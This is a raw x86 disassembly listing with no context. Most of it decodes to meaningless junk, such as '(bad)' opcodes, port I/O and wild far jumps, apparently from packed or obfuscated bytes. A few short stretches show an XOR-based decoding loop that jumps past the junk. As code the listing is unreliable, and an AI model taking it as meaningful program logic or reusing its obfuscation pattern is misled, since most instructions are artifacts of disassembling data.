  4039b8:	leave  
  4039b9:	mul    DWORD PTR [esi+0xf3e357]
  4039bf:	xor    DWORD PTR [edx+0x7b],ebp
  4039c2:	loopne 0x403a0a
  4039c4:	xchg   ecx,eax
  4039c5:	out    0xea,al
  4039c7:	pop    es
  4039c8:	cs pop ss
  4039ca:	lock data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039cd:	inc    esp
  4039ce:	jle    0x403a36
  4039d0:	icebp  
  4039d1:	adc    edi,ebx
  4039d3:	imul   esp,ebx,0xffffff95
  4039d6:	fnsave [edx-0x74]
  4039d9:	adc    eax,0xd6fd9f29
  4039de:	mov    BYTE PTR ss:[ebp-0x19],dl
  4039e2:	leave  
  4039e3:	pop    ss
  4039e4:	popa   
  4039e5:	sub    BYTE PTR [edi+0x7d],dh
  4039e8:	imul   BYTE PTR [esi]
  4039ea:	add    dh,dh
  4039ec:	fcomi  st,st(4)
  4039ee:	fcomi  st,st(0)
  4039f0:	das    
  4039f1:	pop    ss
  4039f2:	and    eax,0x66d071f6
  4039f7:	icebp  
  4039f8:	ins    DWORD PTR es:[edi],dx
  4039f9:	arpl   WORD PTR [esi+0x3],ax
  4039fc:	rcr    DWORD PTR [edi-0x3ae6cf7e],0x3
  403a03:	lods   eax,DWORD PTR ds:[esi]
  403a04:	(bad)  
  403a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a06:	imul   esi,ebp,0xe3933dc4
  403a0c:	push   ss
  403a0d:	mov    dl,0x9d
  403a0f:	mov    bl,BYTE PTR gs:[eax]
  403a12:	dec    edi
  403a13:	mov    dh,0x85
  403a15:	inc    ebx
  403a16:	dec    eax
  403a17:	jo     0x403a3f
  403a19:	mul    BYTE PTR [eax+0x30]
  403a1c:	fwait
  403a1d:	jp     0x403a98
  403a1f:	mov    ch,0x91
  403a21:	mov    eax,0x53ece3d1
  403a26:	popa   
  403a27:	jno    0x403a9d
  403a29:	in     al,0x4a
  403a2b:	cmp    eax,0xca7de2b
  403a30:	or     dh,BYTE PTR [ecx+eiz*8-0x53]
  403a34:	mov    ah,0x78
  403a36:	and    eax,0xde8da6e
  403a3b:	push   esp
  403a3c:	jmp    0x7044180c
  403a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a42:	or     edx,DWORD PTR [esi]
  403a44:	int3   
  403a45:	out    0x89,eax
  403a47:	xor    al,BYTE PTR [edx+0x729737c5]
  403a4d:	out    0xdd,al
  403a4f:	jmp    0x62da:0xe0d2dd4c
  403a56:	fist   WORD PTR [ebx-0x764584fe]
  403a5c:	icebp  
  403a5d:	stos   BYTE PTR es:[edi],al
  403a5e:	gs xor eax,0x20805432
  403a64:	popf   
  403a65:	fisubr DWORD PTR [esp+edx*4-0x7a2bcf3a]
  403a6c:	sbb    BYTE PTR [edi+esi*4+0x25ebcdfb],bl
  403a73:	mov    ebp,0x1f31d9a4
  403a78:	dec    ecx
  403a79:	mov    dl,BYTE PTR [eax-0x3e5e4da0]
  403a7f:	push   ebp
  403a80:	(bad)  [edi-0x37]
  403a83:	imul   esp,DWORD PTR [edx+0x32f0fb72],0x4af7de95
  403a8d:	dec    ebp
  403a8e:	add    al,0x8b
  403a90:	sti    
  403a91:	leave  
  403a92:	das    
  403a93:	hlt    
  403a94:	sbb    DWORD PTR [ebx],ebx
  403a96:	mov    ebp,0xd3b56613
  403a9b:	ds inc ecx
  403a9d:	inc    ebx
  403a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9f:	jb     0x403a65
  403aa1:	hlt    
  403aa2:	jge    0x403abd
  403aa4:	fs cld 
  403aa6:	add    edi,DWORD PTR ds:0x9b818402
  403aac:	or     al,BYTE PTR [eax+edi*8+0x62cce953]
  403ab3:	mov    ds:0x8842abe7,al
  403ab8:	fnstcw WORD PTR [esi-0x6c763bc0]
  403abe:	mov    ah,0x6f
  403ac0:	(bad)  
  403ac1:	movhps xmm4,QWORD PTR [edi-0x8bbdd01]
  403ac8:	sub    ah,BYTE PTR [ebx]
  403aca:	pop    esi
  403acb:	outs   dx,BYTE PTR ds:[esi]
  403acc:	ja     0x403a53
  403ace:	mov    ch,0x95
  403ad0:	mov    esp,0x75068843
  403ad5:	jg     0x403b4f
  403ad7:	jne    0x403ab4
  403ad9:	sar    BYTE PTR [ecx-0x63],1
  403adc:	ins    DWORD PTR es:[edi],dx
  403add:	(bad)  
  403ade:	and    ebp,DWORD PTR [edx+0x22]
  403ae1:	out    0xd,eax
  403ae3:	mov    eax,0x5dfc7d6c
  403ae8:	push   es
  403ae9:	jns    0x403ac2
  403aeb:	pop    ecx
  403aec:	push   edx
  403aed:	mov    cl,0xc3
  403aef:	je     0x403b22
  403af1:	cwde   
  403af2:	xabort 0x7b
  403af5:	cwde   
  403af6:	jb     0x403b77
  403af8:	pop    ecx
  403af9:	add    al,0xa3
  403afb:	inc    esp
  403afc:	mov    ecx,0x7cb98875
  403b01:	scas   al,BYTE PTR es:[edi]
  403b02:	adc    dh,bl
  403b04:	jg     0x403b1d
  403b06:	mov    esi,0xf8142b01
  403b0b:	mov    eax,ds:0xf2b3acd
  403b10:	cmp    DWORD PTR [edx],esp
  403b12:	ss jbe 0x403b6a
  403b15:	aaa    
  403b16:	(bad)  
  403b17:	push   esi
  403b18:	scas   eax,DWORD PTR es:[di]
  403b1a:	jl     0x403aea
  403b1c:	icebp  
  403b1d:	repnz aad 0x2a
  403b20:	dec    esp
  403b21:	sub    edx,edi
  403b23:	shl    DWORD PTR ds:0x36620710,1
  403b29:	xchg   eax,edx
  403b2b:	cdq    
  403b2c:	icebp  
  403b2d:	jbe    0x403aeb
  403b2f:	jl     0x403b60
  403b31:	ror    cl,1
  403b33:	fist   DWORD PTR [edi-0x1a]
  403b36:	iret   
  403b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b38:	scas   al,BYTE PTR es:[edi]
  403b39:	mov    eax,ds:0xbd2741ba
  403b3e:	add    BYTE PTR [edx],0xcd
  403b41:	in     al,dx
  403b42:	std    
  403b43:	xchg   edi,eax
  403b44:	ins    BYTE PTR es:[edi],dx
  403b45:	call   0x25fb:0xc7a12b53
  403b4c:	push   0x79851737
  403b51:	and    DWORD PTR [edi+edi*2+0x55dfaeda],0xffffffc3
  403b59:	sti    
  403b5a:	js     0x403b66
  403b5c:	xor    al,0xed
  403b5e:	fadd   DWORD PTR [eax+ebx*8-0x3d]
  403b62:	ret    
  403b63:	dec    eax
  403b64:	outs   dx,DWORD PTR ds:[esi]
  403b65:	pop    edx
  403b66:	jl     0x403bb5
  403b68:	test   al,0xee
  403b6a:	adc    bh,BYTE PTR [ebx+0x6bfd2c77]
  403b70:	dec    esp
  403b71:	(bad)  
  403b73:	mov    bl,BYTE PTR [edi+0x40]
  403b76:	sub    edi,DWORD PTR [ebp+0x48]
  403b79:	xor    BYTE PTR [esi-0x78],bh
  403b7c:	je     0x403b1f
  403b7e:	in     eax,dx
  403b7f:	jbe    0x403b5c
  403b81:	fisubr WORD PTR [ebx-0x4cb608ee]
  403b87:	pop    edx
  403b88:	fs push edi
  403b8a:	cmp    dl,BYTE PTR [edi-0x32]
  403b8d:	aad    0x2d
  403b8f:	pop    edx
  403b90:	imul   edi,DWORD PTR [ecx+0x39],0xffffff95
  403b94:	stos   DWORD PTR es:[edi],eax
  403b95:	xchg   ebp,eax
  403b96:	in     al,0x45
  403b98:	ss popa 
  403b9a:	outs   dx,DWORD PTR ds:[esi]
  403b9b:	add    dh,BYTE PTR [ecx-0x60]
  403b9e:	rol    BYTE PTR [edx-0x79443806],cl
  403ba4:	int3   
  403ba5:	(bad)  
  403ba6:	data16 int3 
  403ba8:	data16 (bad) 
  403bab:	pushf  
  403bac:	push   eax
  403bad:	jb     0x403bc9
  403baf:	int    0x92
  403bb1:	push   ecx
  403bb2:	sbb    eax,0xc2a08981
  403bb7:	das    
  403bb8:	ret    0x9019
  403bbb:	or     edi,esi
  403bbd:	or     DWORD PTR [ebp+0x41],esp
  403bc0:	mov    dh,0x48
  403bc2:	sbb    eax,0x2379a911
  403bc7:	mov    BYTE PTR [ecx],dl
  403bc9:	xchg   edi,eax
  403bca:	ins    DWORD PTR es:[edi],dx
  403bcb:	rcl    BYTE PTR [ecx],cl
  403bcd:	sbb    ebp,DWORD PTR [ebp+edi*2-0x37]
  403bd1:	cld    
  403bd2:	aaa    
  403bd3:	lea    ebx,[ecx+0x6434bcda]
  403bd9:	fst    st(6)
  403bdb:	in     eax,0x68
  403bdd:	cmp    eax,0x24f31ec1
  403be2:	mov    esp,0xb83b798f
  403be7:	out    0x83,eax
  403be9:	loope  0x403b7c
  403beb:	and    BYTE PTR [eax],dh
  403bed:	jae    0x403bec
  403bef:	mov    edi,db7
  403bf2:	enter  0x53f0,0x29
  403bf6:	in     eax,dx
  403bf7:	pop    esi
  403bf8:	push   edi
  403bf9:	fdivr  DWORD PTR [edi+ecx*4]
  403bfc:	cmp    al,0x11
  403bfe:	ret    
  403bff:	mov    ebx,0x435b12a
  403c04:	push   esp
  403c05:	mov    ss,ebp
  403c07:	(bad)  
  403c08:	rcl    DWORD PTR ds:0x78d7beaa,1
  403c0e:	mov    ebp,0xd2536f09
  403c13:	dec    esp
  403c14:	mov    dl,0xc5
  403c16:	jbe    0x403c77
  403c18:	daa    
  403c19:	inc    ebx
  403c1a:	scas   eax,DWORD PTR es:[edi]
  403c1b:	sub    DWORD PTR [edx+esi*8-0x65],esp
  403c1f:	or     BYTE PTR [edx-0x3181f1de],ch
  403c25:	ds xchg ebx,eax
  403c27:	ficom  DWORD PTR [ebx-0x74]
  403c2a:	dec    esp
  403c2b:	jp     0x403c61
  403c2d:	jmp    0x403c4e
  403c2f:	sbb    eax,0xbec69bf4
  403c34:	jnp    0x403bf3
  403c36:	dec    ecx
  403c37:	aaa    
  403c38:	pop    edi
  403c39:	cmp    DWORD PTR [eax-0x20],edi
  403c3c:	test   al,0xcc
  403c3e:	xor    BYTE PTR es:[eax+0x543337a9],bh
  403c45:	mov    BYTE PTR [edx-0x1514cf3b],bl
  403c4b:	das    
  403c4c:	push   0xa97aa6c9
  403c51:	daa    
  403c52:	pop    ss
  403c53:	cmp    eax,0x2065ffd8
  403c58:	and    eax,esi
  403c5a:	lea    ebp,[ebx-0x314efe6e]
  403c60:	into   
  403c61:	or     edx,ecx
  403c63:	aam    0xe2
  403c65:	iret   
  403c66:	and    al,0x1b
  403c68:	mov    eax,ds:0xd5797e5c
  403c6d:	xor    ebx,ebx
  403c6f:	rcr    DWORD PTR [eax*2+0x7f6c7f23],cl
  403c76:	jb     0x403cbf
  403c78:	mov    WORD PTR [ecx-0x9],?
  403c7b:	ds stos DWORD PTR es:[edi],eax
  403c7d:	sbb    al,0x2d
  403c7f:	je     0x403ca8
  403c81:	aas    
  403c82:	test   DWORD PTR [esi+0x6c61e20f],ecx
  403c88:	gs push 0x8ae1aa61
  403c8e:	xor    cl,BYTE PTR [ecx+0x5e]
  403c91:	xor    eax,0x9dc6ab19
  403c96:	and    eax,0x86235884
  403c9b:	add    DWORD PTR [esi],esi
  403c9d:	call   0xc703:0x6679e0fd
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x58f3ac33
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cce
  403cf7:	into   
  403cf8:	shl    BYTE PTR [eax-0xd],1
  403cfb:	jmp    0x96947a7c
  403d00:	fadd   st(1),st
  403d02:	rcl    BYTE PTR ds:0x38b2508f,0x30
  403d09:	sub    eax,0x1478042c
  403d0e:	xor    al,0x58
  403d10:	call   0x7a074cf9
  403d15:	xchg   ecx,eax
  403d16:	sbb    al,BYTE PTR [ecx]
  403d18:	push   ss
  403d19:	int    0x5
  403d1b:	daa    
  403d1c:	xor    eax,0xd74948b2
  403d21:	inc    eax
  403d22:	mov    BYTE PTR [esi+0x40],al
  403d25:	sbb    DWORD PTR [esi],ebp
  403d27:	cmp    BYTE PTR [edi-0x3e],ah
  403d2a:	xor    ch,BYTE PTR [esi]
  403d2c:	js     0x403d40
  403d2e:	lods   al,BYTE PTR ds:[esi]
  403d2f:	jbe    0x403d23
  403d31:	jmp    0x403d10
  403d33:	or     bh,BYTE PTR [edx+eax*4+0x246eb5aa]
  403d3a:	pop    ecx
  403d3b:	cld    
  403d3c:	mov    ebx,0x1494da6d
  403d41:	or     BYTE PTR [eax-0xf509562],cl
  403d47:	push   0xc
  403d49:	push   ebx
  403d4a:	sub    esi,DWORD PTR [esi]
  403d4c:	add    ah,BYTE PTR [eax+0x3942a908]
  403d52:	lods   eax,DWORD PTR ds:[esi]
  403d53:	clc    
  403d54:	sbb    bl,BYTE PTR [esi-0x4943eb94]
  403d5a:	stos   BYTE PTR es:[edi],al
  403d5b:	mov    cl,0xc
  403d5d:	std    
  403d5e:	test   BYTE PTR [ebp-0x75],ah
  403d61:	and    eax,0xa1f6b630
  403d66:	xor    bh,al
  403d68:	hlt    
  403d69:	aas    
  403d6a:	jne    0x403de1
  403d6c:	hlt    
  403d6d:	aaa    
  403d6e:	add    al,0x6f
  403d70:	int    0x49
  403d72:	jb     0x403ddb
  403d74:	js     0x403d92
  403d76:	mov    ?,WORD PTR [ebx]
  403d78:	or     ch,BYTE PTR [ebx]
  403d7a:	jp     0x403d0f
  403d7c:	adc    eax,0xf4281563
  403d81:	mov    dl,0x99
  403d83:	shl    bl,0xe8
  403d86:	mov    bl,dh
  403d88:	rcl    dh,0xc3
  403d8b:	jge    0x403d7a
  403d8d:	fdiv   st,st(3)
  403d8f:	add    bl,BYTE PTR ds:0xcaa9aeb6
  403d95:	mov    ebx,0xaf5bde88
  403d9a:	iret   
  403d9b:	sbb    eax,DWORD PTR [esi+0x6e5826dc]
  403da1:	imul   ebp,DWORD PTR [ebx],0xfffffff7
  403da4:	jp     0x403d78
  403da6:	popa   
  403da7:	in     al,0x63
  403da9:	fistp  DWORD PTR [ebp+ebp*4+0x68]
  403dad:	(bad)  
  403dae:	xchg   edi,eax
  403daf:	shl    BYTE PTR [edi],0xc1
  403db2:	jp     0x403dfa
  403db4:	ins    BYTE PTR es:[edi],dx
  403db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403db6:	or     al,0xd
  403db8:	cmp    ch,ah
  403dba:	add    DWORD PTR ss:[ebx],eax
  403dbd:	outs   dx,BYTE PTR ds:[esi]
  403dbe:	out    dx,eax
  403dbf:	loopne 0x403d64
  403dc1:	leave  
  403dc2:	sbb    ch,BYTE PTR [esi-0x1e7fb89a]
  403dc8:	jo     0x403e05
  403dca:	xchg   ecx,eax
  403dcb:	clc    
  403dcc:	dec    edi
  403dcd:	mov    ebp,0x35aa16ce
  403dd2:	or     DWORD PTR [esi-0x61],esi
  403dd5:	hlt    
  403dd6:	sub    al,0x20
  403dd8:	or     BYTE PTR [edi+0x7dfbc85],0x5b
  403ddf:	pushf  
  403de0:	add    BYTE PTR [esi+esi*1-0x26915a0a],dl
  403de7:	ins    BYTE PTR es:[edi],dx
  403de8:	push   esi
  403de9:	dec    eax
  403dea:	xchg   BYTE PTR [eax+0x6feba9fd],al
  403df0:	xchg   esp,eax
  403df1:	outs   dx,BYTE PTR ds:[esi]
  403df2:	mov    ds:0xa965948c,al
  403df7:	jg     0x403dc6
  403df9:	fiadd  DWORD PTR [ebx]
  403dfb:	lds    ebp,FWORD PTR [esi]
  403dfd:	mov    eax,ds:0x3fe636c
  403e02:	mov    ecx,0xdceb7c5e
  403e07:	mov    dh,0xf8
  403e09:	lea    edi,[ecx]
  403e0b:	mov    esp,0x91ca67de
  403e10:	imul   edi,ecx,0x1b
  403e13:	loopne 0x403dfd
  403e15:	daa    
  403e16:	push   cs
  403e17:	or     DWORD PTR [eax-0x1f43a58],ebp
  403e1d:	(bad)  
  403e1e:	xor    BYTE PTR [ecx],bl
  403e20:	mul    DWORD PTR [ecx+0x1183a230]
  403e26:	jmp    0x140cd121
  403e2b:	jl     0x403e41
  403e2d:	sbb    WORD PTR [eax-0x34],si
  403e31:	jns    0x403e5b
  403e33:	xchg   esi,eax
  403e34:	dec    edx
  403e35:	sub    BYTE PTR [eax-0x6c18167b],dl
  403e3b:	mov    BYTE PTR [eax+0x598a6b5f],dl
  403e41:	push   eax
  403e42:	stos   DWORD PTR es:[edi],eax
  403e43:	push   ecx
  403e44:	rcr    ah,0xca
  403e47:	bound  esp,QWORD PTR [eax]
  403e49:	mov    DWORD PTR [ebp+0x77979fbe],esi
  403e4f:	dec    eax
  403e50:	ins    DWORD PTR es:[edi],dx
  403e51:	push   cs
  403e52:	or     al,0x6b
  403e54:	or     bh,BYTE PTR [edi]
  403e56:	inc    edi
  403e57:	mov    ecx,0xe4b175f3
  403e5c:	push   esi
  403e5d:	mov    ecx,0x2a2e1c39
  403e62:	bound  esp,QWORD PTR [ecx+0x23]
  403e65:	lods   al,BYTE PTR ds:[esi]
  403e66:	inc    esi
  403e67:	jecxz  0x403e0b
  403e69:	mov    dh,0x78
  403e6b:	dec    edi
  403e6c:	int3   
  403e6d:	js     0x403e2c
  403e6f:	in     eax,dx
  403e70:	in     al,0xf8
  403e72:	dec    ecx
  403e73:	dec    ebx
  403e74:	in     al,dx
  403e75:	adc    esp,DWORD PTR [ebx]
  403e77:	lds    eax,FWORD PTR [ebx-0x2a]
  403e7a:	das    
  403e7b:	cli    
  403e7c:	(bad)  
  403e7d:	jae    0x403e53
  403e7f:	sahf   
  403e80:	frstor [ecx-0x11697b6]
  403e86:	mov    ebp,0x8d5e20f5
  403e8b:	jnp    0x403e91
  403e8d:	sbb    eax,0x699b7aef
  403e92:	inc    edx
  403e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e94:	aad    0x34
  403e96:	cmp    bl,BYTE PTR [esi-0x21]
  403e99:	das    
  403e9a:	cmp    bl,BYTE PTR [edx-0x7044d75c]
  403ea0:	repz mov cl,dh
  403ea3:	jae    0x403e6a
  403ea5:	test   DWORD PTR [ebp-0x12c6cd9a],edi
  403eab:	cwde   
  403eac:	cmp    al,0x30
  403eae:	pop    esi
  403eaf:	dec    ebx
  403eb0:	popa   
  403eb1:	and    DWORD PTR [ebx],edi
  403eb3:	iret   
  403eb4:	fadd   DWORD PTR [edi+0x8]
  403eb7:	sbb    eax,0xf275f796
  403ebc:	mov    bh,0xe9
  403ebe:	and    ebp,ebx
  403ec0:	addr16 int 0x42
  403ec3:	bound  ebx,QWORD PTR [edx]
  403ec5:	sub    DWORD PTR [eax+eax*1],ebp
  403ec8:	scas   al,BYTE PTR es:[edi]
  403ec9:	int3   
  403eca:	es mov esp,0x2f504c31
  403ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed1:	js     0x403ef5
  403ed3:	sbb    eax,0xf7a9ace8
  403ed8:	jno    0xb6a1d5d5
  403ede:	(bad)  
  403edf:	sbb    eax,0xab330199
  403ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ee5:	les    ecx,FWORD PTR [edi]
  403ee7:	mov    bh,0xf4
  403ee9:	(bad)  
  403eea:	retf   
  403eeb:	mov    eax,0x49674bdd
  403ef0:	push   ebp
  403ef1:	pop    ecx
  403ef2:	dec    esi
  403ef3:	call   0x8651:0xd68371d1
  403efa:	dec    ecx
  403efb:	jo     0x403ea0
  403efd:	loop   0x403edf
  403eff:	fsubr  st(4),st
  403f01:	inc    edx
  403f02:	fcomi  st,st(7)
  403f04:	jle    0x403e9c
  403f06:	mov    ebx,0x1d85ec24
  403f0b:	adc    DWORD PTR [ecx+eax*2],esi
  403f0e:	mov    ebx,0xdd0e79c7
  403f13:	push   ebx
  403f14:	jmp    0xb2b3f462
  403f19:	xlat   BYTE PTR ds:[ebx]
  403f1a:	xlat   BYTE PTR ds:[ebx]
  403f1b:	scas   al,BYTE PTR es:[edi]
  403f1c:	xor    DWORD PTR [ecx+0x61b3a4bb],ecx
  403f22:	push   0x90bacb14
  403f27:	xchg   edx,eax
  403f28:	retw   0xfda4
  403f2c:	jo     0x403f6d
  403f2e:	mov    cl,0x7d
  403f30:	test   BYTE PTR [ecx-0x63f91154],al
  403f36:	iret   
  403f37:	jno    0x403f45
  403f39:	xor    bl,BYTE PTR [edi+0x512e4a88]
  403f3f:	imul   ebx,DWORD PTR [edx],0x1db8ce05
  403f45:	shr    BYTE PTR [esi+0x4a7c1cfd],1
  403f4b:	cdq    
  403f4c:	jp     0x403f1a
  403f4e:	add    cl,BYTE PTR [ecx-0x26]
  403f51:	jb     0x403fc7
  403f53:	lds    esp,FWORD PTR [ecx+0x6d]
  403f56:	enter  0xd4f5,0x77
  403f5a:	inc    edx
  403f5b:	push   0xfffffffc
  403f5d:	fiadd  WORD PTR [edi]
  403f5f:	imul   eax,ecx,0x8bcc4967
  403f65:	aaa    
  403f66:	adc    edi,DWORD PTR [ecx]
  403f68:	fwait
  403f69:	ret    
  403f6a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f6c:	dec    esi
  403f6d:	mov    es,WORD PTR [eax-0x6c628eab]
  403f73:	je     0x403f63
  403f75:	adc    al,BYTE PTR [edi]
  403f77:	jno    0x403f32
  403f79:	mov    ebx,0x702bf6db
  403f7e:	cli    
  403f7f:	test   dl,ah
  403f81:	cld    
  403f82:	outs   dx,DWORD PTR ds:[esi]
  403f83:	mov    bh,0x62
  403f85:	sub    ebp,DWORD PTR [edx+0x518a49d0]
  403f8b:	stc    
  403f8c:	jbe    0x403f6d
  403f8e:	enter  0x62d1,0x1a
  403f92:	pop    ss
  403f93:	cmp    bh,cl
  403f95:	mov    al,0xa5
  403f97:	into   
  403f98:	mov    edx,0x2ec48410
  403f9d:	adc    bh,BYTE PTR [edx+ebx*2+0x62]
  403fa1:	pushf  
  403fa2:	mov    dl,0xf1
  403fa4:	sub    DWORD PTR [esi],0xffffffd4
  403fa7:	add    BYTE PTR [edx+ecx*2-0x6e],cl
  403fab:	repnz mov bh,0x2c
  403fae:	xor    dh,BYTE PTR [eax+0x12af370d]
  403fb4:	in     eax,dx
  403fb5:	add    dl,bh
  403fb7:	retf   
  403fb8:	mov    edi,0x2978cf8c
  403fbd:	sub    al,0x59
  403fbf:	test   DWORD PTR [ebx-0x6e27e1a0],eax
  403fc5:	jl     0x40400c
  403fc7:	mov    bh,0xde
  403fc9:	inc    esi
  403fca:	popf   
  403fcb:	jl     0x40403e
  403fcd:	(bad)  
  403fce:	fld    QWORD PTR [ecx]
  403fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd1:	add    BYTE PTR [ebx+ecx*4-0x63],cl
  403fd5:	lahf   
  403fd6:	cmp    eax,0x684fb2fa
  403fdb:	cs and eax,0x9df032e5
  403fe1:	in     eax,0x60
  403fe3:	sar    BYTE PTR [edi+0x319dde0c],cl
  403fe9:	stos   BYTE PTR es:[edi],al
  403fea:	inc    edx
  403feb:	mov    eax,0x6067089d
  403ff0:	leave  
  403ff1:	ds stc 
  403ff3:	daa    
  403ff4:	into   
  403ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff6:	stos   DWORD PTR es:[edi],eax
  403ff7:	cmp    ebx,DWORD PTR [ebx-0x3a]
  403ffa:	jae    0x403f98
  403ffc:	jl     0x403f88
  403ffe:	fist   WORD PTR [ebx]
  404000:	in     al,0xfb
  404002:	or     BYTE PTR [edx],0x26
  404005:	xchg   ebx,eax
  404006:	popa   
  404007:	clc    
  404008:	xor    al,0xd7
  40400a:	xchg   ecx,eax
  40400b:	(bad)  
  40400c:	lock les ecx,FWORD PTR [ebp+0x27]
  404010:	mov    esi,0x599c1349
  404015:	repz loopne 0x404061
  404018:	test   al,0xb9
  40401a:	bswap  ebx
  40401c:	mov    bl,0x7b
  40401e:	mov    ds:0x3f3cff7b,eax
  404023:	call   0x99db431a
  404028:	loope  0x40401d
  40402a:	pushf  
  40402b:	cdq    
  40402c:	adc    eax,0x97e35db5
  404031:	dec    eax
  404032:	dec    edi
  404033:	dec    ecx
  404034:	mov    edi,0xb7dc42a0
  404039:	add    eax,0xdb2baa4d
  40403e:	paddd  mm6,QWORD PTR [edi-0x75fdbbaa]
  404045:	scas   al,BYTE PTR es:[edi]
  404046:	repz int 0x6d
  404049:	jo     0x403fcc
  40404b:	pop    es
  40404c:	pushf  
  40404d:	xchg   edi,eax
  40404e:	and    al,0xa2
  404050:	aas    
  404051:	cmp    dl,ch
  404053:	mov    WORD PTR [ecx],?
  404055:	mov    ah,0xca
  404057:	sbb    eax,0x168c73b5
  40405c:	jmp    0x4040db
  40405e:	cmp    ch,BYTE PTR ds:0x8455c6e5
  404064:	fld    QWORD PTR [edx-0x3b32c632]
  40406a:	std    
  40406b:	cli    
  40406c:	loop   0x4040e7
  40406e:	and    bl,ch
  404070:	loope  0x40404c
  404072:	pusha  
  404073:	jp     0x40407e
  404075:	popf   
  404076:	lods   al,BYTE PTR ds:[si]
  404078:	ss ret 
  40407a:	or     eax,0x4a1b86e6
  40407f:	or     cl,dh
  404081:	sub    BYTE PTR [esi+0x60],0x1c
  404085:	addr16 repz xor eax,0x8a89c195
  40408c:	sbb    BYTE PTR [edi-0x2654cc5d],cl
  404092:	mov    eax,ds:0x269efd14
  404097:	mov    edi,0x761fd50d
  40409c:	je     0x40406a
  40409e:	mov    bl,0x7c
  4040a0:	sahf   
  4040a1:	in     al,0x4c
  4040a3:	inc    ebx
  4040a4:	out    0xdd,eax
  4040a6:	jno    0x404108
  4040a8:	inc    eax
  4040a9:	sub    BYTE PTR [esi-0x44],al
  4040ac:	cmc    
  4040ad:	ds jns 0x4040d3
  4040b0:	dec    ebp
  4040b1:	fldcw  WORD PTR [edx+0x560650d5]
  4040b7:	clc    
  4040b8:	xlat   BYTE PTR ds:[ebx]
  4040b9:	dec    ecx
  4040ba:	push   ds
  4040bb:	jnp    0x40406b
  4040bd:	test   eax,0x4994bc1c
  4040c2:	jns    0x404097
  4040c4:	loopne 0x404049
  4040c6:	mov    esi,0x5f956108
  4040cb:	push   ss
  4040cc:	lea    edx,[ecx-0x75]
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax+0x3460d7cd],ah
  4040ef:	push   0xffffff93
  4040f1:	sbb    edi,DWORD PTR [esi+0x7e]
  4040f4:	push   esi
  4040f5:	jns    0x404175
  4040f7:	jle    0x40408e
  4040f9:	xchg   edx,eax
  4040fa:	xchg   esp,eax
  4040fb:	cs fs ins BYTE PTR es:[edi],dx
  4040fe:	popf   
  4040ff:	test   eax,0xc526753a
  404104:	push   ebx
  404105:	or     bh,al
  404107:	push   ds
  404108:	dec    ebp
  404109:	sub    BYTE PTR [ecx-0x1c1e1464],0xf1
  404110:	stos   BYTE PTR es:[edi],al
  404111:	mov    eax,DWORD PTR [esi+ecx*8]
  404114:	idiv   eax
  404116:	rcr    esi,1
  404118:	or     dh,BYTE PTR [esp+edi*4+0x4e]
  40411c:	jns    0x4040d1
  40411e:	mov    ecx,0xd1b77d5a
  404123:	ficom  DWORD PTR [ebx+0x77]
  404126:	sub    eax,0x50c12759
  40412b:	out    dx,al
  40412c:	push   0xdd0c45ab
  404131:	push   ss
  404132:	push   eax
  404133:	gs icebp 
  404135:	stos   DWORD PTR es:[edi],eax
  404136:	lea    edx,[esi+0x64cdec14]
  40413c:	xchg   ebp,eax
  40413d:	lods   al,BYTE PTR ds:[esi]
  40413e:	xchg   BYTE PTR [eax+edx*4],al
  404141:	enter  0x166b,0x64
  404145:	push   ds
  404146:	call   0x7c91:0x8fe05d9a
  40414d:	push   ss
  40414e:	stos   BYTE PTR es:[edi],al
  40414f:	jnp    0x4040d1
  404151:	call   0xb058:0xcbbc1f33
  404158:	and    ah,BYTE PTR [ecx+ebp*1+0x3c]
  40415c:	inc    eax
  40415d:	enter  0xeb8a,0xb8
  404161:	adc    dh,BYTE PTR [edx]
  404163:	pop    ecx
  404164:	sbb    eax,0x66059525
  404169:	dec    ebx
  40416a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40416b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40416c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40416d:	mov    eax,ds:0xedf7b8c5
  404172:	sbb    DWORD PTR [ebp+ebp*1+0x3cc92210],0x1b1c419
